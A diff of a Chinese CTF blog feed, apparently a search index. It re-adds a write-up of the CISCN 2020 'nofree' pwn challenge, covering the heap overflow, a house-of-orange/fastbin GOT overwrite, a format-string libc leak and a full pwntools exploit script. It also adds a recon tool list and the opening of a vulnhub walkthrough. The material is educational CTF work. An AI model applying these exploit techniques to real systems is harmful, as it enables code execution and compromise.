-<h1 id="nofree"><a href="#nofree" class="headerlink" title="nofree"></a>nofree</h1><h2 id="检查保护"><a href="#检查保护" class="headerlink" title="检查保护"></a>检查保护</h2><p><img src="https://gitee.com/ethustdout/pics/raw/master/img/image-20200916171504771.png" alt="image-20200916171504771"></p>
-<p>没有开<code>pie</code>和<code>pelro</code></p>
-<h2 id="反汇编"><a href="#反汇编" class="headerlink" title="反汇编"></a>反汇编</h2><h3 id="main"><a href="#main" class="headerlink" title="main"></a>main</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall __noreturn <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  setvbufs();</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v3 = menu();</span><br><span class="line">      <span class="keyword">if</span> ( v3 != <span class="number">1</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      add();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v3 != <span class="number">2</span> )</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    edit(a1);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="menu"><a href="#menu" class="headerlink" title="menu"></a>menu</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">sub_4009EF</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Management:&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;1- New &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;2- Edit&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;choice&gt;&gt; &quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> get_int();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>正如描述的那样，没有<code>free</code>选项</p>
-<h3 id="add"><a href="#add" class="headerlink" title="add"></a>add</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">add</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  result = get_index();</span><br><span class="line">  v1 = result;</span><br><span class="line">  <span class="keyword">if</span> ( (_DWORD)result != <span class="number">-1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;size: &quot;</span>);</span><br><span class="line">    result = get_int();</span><br><span class="line">    v2 = result;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="keyword">signed</span> <span class="keyword">int</span>)result &gt;= <span class="number">0</span> &amp;&amp; (<span class="keyword">signed</span> <span class="keyword">int</span>)result &lt;= <span class="number">144</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      *(_QWORD *)&amp;heapArray[<span class="number">16</span> * v1 + <span class="number">256</span>] = get_content(result);</span><br><span class="line">      result = v2;</span><br><span class="line">      *(_QWORD *)&amp;heapArray[<span class="number">16</span> * v1 + <span class="number">264</span>] = v2;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>会分配一个堆块，并且把<code>size</code>写进结构体</p>
-<p>但是分配堆块的大小，不是由<code>size</code>决定，而是由<code>strlen(content)</code>决定</p>
-<p>导致了溢出</p>
-<p>并且在add的时候，没有检查堆块是否已经存在，导致无限申请</p>
-<h3 id="edit"><a href="#edit" class="headerlink" title="edit"></a>edit</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">signed</span> __int64 <span class="title">edit</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  result = get_index();</span><br><span class="line">  v1 = result;</span><br><span class="line">  <span class="keyword">if</span> ( (_DWORD)result != <span class="number">-1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = *(_QWORD *)&amp;heapArray[<span class="number">16</span> * (<span class="keyword">signed</span> <span class="keyword">int</span>)result + <span class="number">256</span>];</span><br><span class="line">    <span class="keyword">if</span> ( result )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;content: &quot;</span>);</span><br><span class="line">      result = sub_400916(*(_QWORD *)&amp;heapArray[<span class="number">16</span> * v1 + <span class="number">256</span>], (<span class="keyword">unsigned</span> <span class="keyword">int</span>)*(_QWORD *)&amp;heapArray[<span class="number">16</span> * v1 + <span class="number">264</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>根据<code>size</code>决定，配合<code>add</code>函数造成了堆溢出</p>
-<h2 id="house-of-orange"><a href="#house-of-orange" class="headerlink" title="house of orange"></a>house of orange</h2><p>有一种利用堆溢出可以在没有<code>free</code>函数的情况下得到一个<code>unsortedbin</code>堆块（同理也可以得到<code>fastbin</code></p>
-<p>详情请见CTFwiki</p>
-<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><h3 id="修改topbin"><a href="#修改topbin" class="headerlink" title="修改topbin"></a>修改topbin</h3><p>首先利用堆溢出修改<code>topbin</code>的大小</p>
-<p><img src="https://gitee.com/ethustdout/pics/raw/master/img/image-20200916172303763.png" alt="image-20200916172303763"></p>
-<p>运行之后</p>
-<p><img src="https://gitee.com/ethustdout/pics/raw/master/img/image-20200916172355480.png" alt="image-20200916172355480"></p>
-<p><code>topbin</code>被修改为一个小的值</p>
-<h3 id="得到fastbin"><a href="#得到fastbin" class="headerlink" title="得到fastbin"></a>得到fastbin</h3><p>把剩下的topbin分配掉，留下一个<code>0x90</code>的大小</p>
-<p><img src="https://gitee.com/ethustdout/pics/raw/master/img/image-20200916172714541.png" alt="image-20200916172714541"></p>
-<p>然后分配一个超过它大小的堆块，这个堆块就会进入<code>fastbin</code>(否则进入<code>unsortedbin</code>)</p>
-<p><img src="https://gitee.com/ethustdout/pics/raw/master/img/image-20200916172820568.png" alt="image-20200916172820568"></p>
-<p>并且这个<code>fastbin</code>的<code>fd</code>指针可控（堆溢出）</p>
-<p>修改它为<code>memset@got</code>的地址，就可以修改<code>memset    </code>函数</p>
-<p>这里修改成<code>printf</code>然后利用格式化字符串泄漏libc</p>
-<p><img src="https://gitee.com/ethustdout/pics/raw/master/img/image-20200916173137032.png" alt="image-20200916173137032"></p>
-<p>得到了libc之后在重放一次上面的操作修改<code>atoi@got</code>为<code>system</code>或者<code>one_gadget</code>即可</p>
-<p><img src="https://gitee.com/ethustdout/pics/raw/master/img/image-20200916173416122.png" alt="image-20200916173416122"></p>
-<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/home/shiroha/glibc-all-in-one/libs/2.23-0ubuntu11.2_amd64/libc-2.23.so&quot;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span>(<span class="params">command = <span class="string">&quot;&quot;</span></span>):</span></span><br><span class="line">    gdb.attach(sh, command)</span><br><span class="line">    <span class="built_in">input</span>()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">menu</span>(<span class="params">command</span>):</span></span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>, <span class="built_in">str</span>(command))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>(<span class="params">idx</span>):</span></span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;idx:&quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">idx, size, content</span>):</span></span><br><span class="line">    menu(<span class="number">1</span>)</span><br><span class="line">    index(idx)</span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;size:&quot;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    <span class="keyword">if</span> content != <span class="string">&quot;&quot;</span>:</span><br><span class="line">        sh.sendafter(<span class="string">&quot;content:&quot;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx, content</span>):</span></span><br><span class="line">    menu(<span class="number">2</span>)</span><br><span class="line">    index(idx)</span><br><span class="line">    sh.sendafter(<span class="string">&quot;content:&quot;</span>, content)</span><br><span class="line"></span><br><span class="line">put_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">put_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">printf_plt = elf.plt[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x80</span>, <span class="string">&#x27;a\n&#x27;</span>)</span><br><span class="line">edit(<span class="number">0</span>, <span class="string">&quot;a&quot;</span> * <span class="number">0x18</span> + p64(<span class="number">0xfe1</span>))</span><br><span class="line">[add(<span class="number">0</span>, <span class="number">0x80</span>, <span class="string">&#x27;a&#x27;</span> * <span class="number">0x80</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x1a</span>)]</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x18</span>, <span class="string">&#x27;a&#x27;</span> * <span class="number">0x8</span>)</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x60</span>, <span class="string">&#x27;a&#x27;</span>*<span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x71</span>, <span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x90</span>, <span class="string">&#x27;%17$p&#x27;</span>.ljust(<span class="number">0x90</span>, <span class="string">&#x27;\x01&#x27;</span>))</span><br><span class="line"></span><br><span class="line">memset_addr = elf.got[<span class="string">&#x27;memset&#x27;</span>]</span><br><span class="line">edit(<span class="number">0</span>, <span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x71</span>) + p64(<span class="number">0x6021c0</span>))</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x60</span>, <span class="string">&#x27;a&#x27;</span> * <span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x60</span>, <span class="string">&#x27;%17$p&#x27;</span>.ljust(<span class="number">0x60</span>, <span class="string">&#x27;\x01&#x27;</span>))</span><br><span class="line">edit(<span class="number">0</span>, p64(memset_addr))</span><br><span class="line">edit(<span class="number">1</span>, p64(printf_plt))</span><br><span class="line"></span><br><span class="line">add(<span class="number">2</span>, <span class="number">0x90</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">&#x27;\x30&#x27;</span>)</span><br><span class="line">c = <span class="built_in">int</span>(<span class="string">&#x27;\x30&#x27;</span> + sh.recvuntil(<span class="string">&#x27;\x01&#x27;</span>)[:-<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">print(<span class="string">&quot;c ==&gt; &quot;</span> + <span class="built_in">hex</span>(c))</span><br><span class="line">base = c - libc.symbols[<span class="string">&#x27;__libc_start_main&#x27;</span>] - <span class="number">240</span></span><br><span class="line">print(<span class="string">&quot;base ==&gt; &quot;</span> + <span class="built_in">hex</span>(base))</span><br><span class="line"></span><br><span class="line">system = base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">sh.send(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x90</span>)</span><br><span class="line"><span class="comment"># one = [0x45226, 0x4527a, 0xf0364]</span></span><br><span class="line">edit(<span class="number">0</span>, p64(elf.got[<span class="string">&#x27;atoi&#x27;</span>]))</span><br><span class="line">edit(<span class="number">1</span>, p64(system))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <categories>
-        <category>pwn</category>
-        <category>heap</category>
-      </categories>
-      <tags>
-        <tag>pwn</tag>
-        <tag>heap</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>ACTF2020</title>
     <url>//buu_ACTF2020.html</url>
     <content><![CDATA[<p><a href="%5Bhttps://buuoj.cn/challenges">buuoj</a></p>
@@ -963,6 +1050,62 @@
       <tags>
         <tag>web</tag>
         <tag>buu</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>ciscn初赛-nofree</title>
+    <url>//ciscn_nofree.html</url>
+    <content><![CDATA[<p>2020年国赛 初赛pwn题</p>
+<p>由于我是懒狗，现在才想起来写wp（</p>
+<a id="more"></a>
+
+
+
+<h1 id="nofree"><a href="#nofree" class="headerlink" title="nofree"></a>nofree</h1><h2 id="检查保护"><a href="#检查保护" class="headerlink" title="检查保护"></a>检查保护</h2><p><img src="https://gitee.com/ethustdout/pics/raw/master/img/image-20200916171504771.png" alt="image-20200916171504771"></p>
+<p>没有开<code>pie</code>和<code>pelro</code></p>
+<h2 id="反汇编"><a href="#反汇编" class="headerlink" title="反汇编"></a>反汇编</h2><h3 id="main"><a href="#main" class="headerlink" title="main"></a>main</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall __noreturn <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  setvbufs();</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v3 = menu();</span><br><span class="line">      <span class="keyword">if</span> ( v3 != <span class="number">1</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      add();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v3 != <span class="number">2</span> )</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    edit(a1);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="menu"><a href="#menu" class="headerlink" title="menu"></a>menu</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">sub_4009EF</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Management:&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;1- New &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;2- Edit&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;choice&gt;&gt; &quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> get_int();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>正如描述的那样，没有<code>free</code>选项</p>
+<h3 id="add"><a href="#add" class="headerlink" title="add"></a>add</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">add</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  result = get_index();</span><br><span class="line">  v1 = result;</span><br><span class="line">  <span class="keyword">if</span> ( (_DWORD)result != <span class="number">-1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;size: &quot;</span>);</span><br><span class="line">    result = get_int();</span><br><span class="line">    v2 = result;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="keyword">signed</span> <span class="keyword">int</span>)result &gt;= <span class="number">0</span> &amp;&amp; (<span class="keyword">signed</span> <span class="keyword">int</span>)result &lt;= <span class="number">144</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      *(_QWORD *)&amp;heapArray[<span class="number">16</span> * v1 + <span class="number">256</span>] = get_content(result);</span><br><span class="line">      result = v2;</span><br><span class="line">      *(_QWORD *)&amp;heapArray[<span class="number">16</span> * v1 + <span class="number">264</span>] = v2;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>会分配一个堆块，并且把<code>size</code>写进结构体</p>
+<p>但是分配堆块的大小，不是由<code>size</code>决定，而是由<code>strlen(content)</code>决定</p>
+<p>导致了溢出</p>
+<p>并且在add的时候，没有检查堆块是否已经存在，导致无限申请</p>
+<h3 id="edit"><a href="#edit" class="headerlink" title="edit"></a>edit</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">signed</span> __int64 <span class="title">edit</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  result = get_index();</span><br><span class="line">  v1 = result;</span><br><span class="line">  <span class="keyword">if</span> ( (_DWORD)result != <span class="number">-1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = *(_QWORD *)&amp;heapArray[<span class="number">16</span> * (<span class="keyword">signed</span> <span class="keyword">int</span>)result + <span class="number">256</span>];</span><br><span class="line">    <span class="keyword">if</span> ( result )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;content: &quot;</span>);</span><br><span class="line">      result = sub_400916(*(_QWORD *)&amp;heapArray[<span class="number">16</span> * v1 + <span class="number">256</span>], (<span class="keyword">unsigned</span> <span class="keyword">int</span>)*(_QWORD *)&amp;heapArray[<span class="number">16</span> * v1 + <span class="number">264</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>根据<code>size</code>决定，配合<code>add</code>函数造成了堆溢出</p>
+<h2 id="house-of-orange"><a href="#house-of-orange" class="headerlink" title="house of orange"></a>house of orange</h2><p>有一种利用堆溢出可以在没有<code>free</code>函数的情况下得到一个<code>unsortedbin</code>堆块（同理也可以得到<code>fastbin</code></p>
+<p>详情请见CTFwiki</p>
+<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><h3 id="修改topbin"><a href="#修改topbin" class="headerlink" title="修改topbin"></a>修改topbin</h3><p>首先利用堆溢出修改<code>topbin</code>的大小</p>
+<p><img src="https://gitee.com/ethustdout/pics/raw/master/img/image-20200916172303763.png" alt="image-20200916172303763"></p>
+<p>运行之后</p>
+<p><img src="https://gitee.com/ethustdout/pics/raw/master/img/image-20200916172355480.png" alt="image-20200916172355480"></p>
+<p><code>topbin</code>被修改为一个小的值</p>
+<h3 id="得到fastbin"><a href="#得到fastbin" class="headerlink" title="得到fastbin"></a>得到fastbin</h3><p>把剩下的topbin分配掉，留下一个<code>0x90</code>的大小</p>
+<p><img src="https://gitee.com/ethustdout/pics/raw/master/img/image-20200916172714541.png" alt="image-20200916172714541"></p>
+<p>然后分配一个超过它大小的堆块，这个堆块就会进入<code>fastbin</code>(否则进入<code>unsortedbin</code>)</p>
+<p><img src="https://gitee.com/ethustdout/pics/raw/master/img/image-20200916172820568.png" alt="image-20200916172820568"></p>
+<p>并且这个<code>fastbin</code>的<code>fd</code>指针可控（堆溢出）</p>
+<p>修改它为<code>memset@got</code>的地址，就可以修改<code>memset    </code>函数</p>
+<p>这里修改成<code>printf</code>然后利用格式化字符串泄漏libc</p>
+<p><img src="https://gitee.com/ethustdout/pics/raw/master/img/image-20200916173137032.png" alt="image-20200916173137032"></p>
+<p>得到了libc之后在重放一次上面的操作修改<code>atoi@got</code>为<code>system</code>或者<code>one_gadget</code>即可</p>
+<p><img src="https://gitee.com/ethustdout/pics/raw/master/img/image-20200916173416122.png" alt="image-20200916173416122"></p>
+<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/home/shiroha/glibc-all-in-one/libs/2.23-0ubuntu11.2_amd64/libc-2.23.so&quot;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span>(<span class="params">command = <span class="string">&quot;&quot;</span></span>):</span></span><br><span class="line">    gdb.attach(sh, command)</span><br><span class="line">    <span class="built_in">input</span>()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">menu</span>(<span class="params">command</span>):</span></span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>, <span class="built_in">str</span>(command))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>(<span class="params">idx</span>):</span></span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;idx:&quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">idx, size, content</span>):</span></span><br><span class="line">    menu(<span class="number">1</span>)</span><br><span class="line">    index(idx)</span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;size:&quot;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    <span class="keyword">if</span> content != <span class="string">&quot;&quot;</span>:</span><br><span class="line">        sh.sendafter(<span class="string">&quot;content:&quot;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx, content</span>):</span></span><br><span class="line">    menu(<span class="number">2</span>)</span><br><span class="line">    index(idx)</span><br><span class="line">    sh.sendafter(<span class="string">&quot;content:&quot;</span>, content)</span><br><span class="line"></span><br><span class="line">put_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">put_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">printf_plt = elf.plt[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x80</span>, <span class="string">&#x27;a\n&#x27;</span>)</span><br><span class="line">edit(<span class="number">0</span>, <span class="string">&quot;a&quot;</span> * <span class="number">0x18</span> + p64(<span class="number">0xfe1</span>))</span><br><span class="line">[add(<span class="number">0</span>, <span class="number">0x80</span>, <span class="string">&#x27;a&#x27;</span> * <span class="number">0x80</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x1a</span>)]</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x18</span>, <span class="string">&#x27;a&#x27;</span> * <span class="number">0x8</span>)</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x60</span>, <span class="string">&#x27;a&#x27;</span>*<span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x71</span>, <span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x90</span>, <span class="string">&#x27;%17$p&#x27;</span>.ljust(<span class="number">0x90</span>, <span class="string">&#x27;\x01&#x27;</span>))</span><br><span class="line"></span><br><span class="line">memset_addr = elf.got[<span class="string">&#x27;memset&#x27;</span>]</span><br><span class="line">edit(<span class="number">0</span>, <span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x71</span>) + p64(<span class="number">0x6021c0</span>))</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x60</span>, <span class="string">&#x27;a&#x27;</span> * <span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x60</span>, <span class="string">&#x27;%17$p&#x27;</span>.ljust(<span class="number">0x60</span>, <span class="string">&#x27;\x01&#x27;</span>))</span><br><span class="line">edit(<span class="number">0</span>, p64(memset_addr))</span><br><span class="line">edit(<span class="number">1</span>, p64(printf_plt))</span><br><span class="line"></span><br><span class="line">add(<span class="number">2</span>, <span class="number">0x90</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">&#x27;\x30&#x27;</span>)</span><br><span class="line">c = <span class="built_in">int</span>(<span class="string">&#x27;\x30&#x27;</span> + sh.recvuntil(<span class="string">&#x27;\x01&#x27;</span>)[:-<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">print(<span class="string">&quot;c ==&gt; &quot;</span> + <span class="built_in">hex</span>(c))</span><br><span class="line">base = c - libc.symbols[<span class="string">&#x27;__libc_start_main&#x27;</span>] - <span class="number">240</span></span><br><span class="line">print(<span class="string">&quot;base ==&gt; &quot;</span> + <span class="built_in">hex</span>(base))</span><br><span class="line"></span><br><span class="line">system = base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">sh.send(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x90</span>)</span><br><span class="line"><span class="comment"># one = [0x45226, 0x4527a, 0xf0364]</span></span><br><span class="line">edit(<span class="number">0</span>, p64(elf.got[<span class="string">&#x27;atoi&#x27;</span>]))</span><br><span class="line">edit(<span class="number">1</span>, p64(system))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>pwn</category>
+        <category>heap</category>
+      </categories>
+      <tags>
+        <tag>pwn</tag>
+        <tag>heap</tag>
       </tags>
   </entry>
   <entry>
@@ -1762,6 +1905,28 @@
         <tag>web</tag>
         <tag>ctf</tag>
         <tag>sql</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>信息收集的一些姿势</title>
+    <url>//information.html</url>
+    <content><![CDATA[<p>记录一下目前用到的某些小工具（不全，慢慢补，不急）</p>
+<a id="more"></a>
+
+<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="子域名收集"><a href="#子域名收集" class="headerlink" title="子域名收集"></a>子域名收集</h2><ul>
+<li>  <a href="https://securitytrails.com/">https://securitytrails.com/</a></li>
+</ul>
+<h2 id="钟馗之眼"><a href="#钟馗之眼" class="headerlink" title="钟馗之眼"></a>钟馗之眼</h2><p><a href="https://www.zoomeye.org/">https://www.zoomeye.org/</a></p>
+<h2 id="censys"><a href="#censys" class="headerlink" title="censys"></a>censys</h2><p><a href="https://censys.io/">https://censys.io/</a></p>
+<h2 id="ip历史解析"><a href="#ip历史解析" class="headerlink" title="ip历史解析"></a>ip历史解析</h2><ul>
+<li>  ip查询：<a href="https://ipchaxun.com/">https://ipchaxun.com/</a></li>
+</ul>
+]]></content>
+      <categories>
+        <category>exploit</category>
+      </categories>
+      <tags>
+        <tag>exploit</tag>
       </tags>
   </entry>
   <entry>
@@ -2668,6 +2833,79 @@
       </tags>
   </entry>
   <entry>
+    <title>vulnhub hacks:Os-hacknos-1靶机</title>
+    <url>//Os-hacknos.html</url>
+    <content><![CDATA[<p>vulnhub里的 nezikochan 靶机</p>
+<p>简单/中等难度</p>
+<a id="more"></a>
+
+
+
+<h1 id="Os-hacknos-1"><a href="#Os-hacknos-1" class="headerlink" title="Os-hacknos-1"></a>Os-hacknos-1</h1><p>靶机的ip地址为<code>192.168.2.175</code></p>
+<p>开放端口<code>22 80</code></p>
+<h2 id="80"><a href="#80" class="headerlink" title="80"></a>80</h2><p>访问之后的页面是一个默认页面</p>
+<img src="hacknos:Os-hacknos:1/image-20200726154227817.png" alt="image-20200726154227817" style="zoom:50%;" />
+
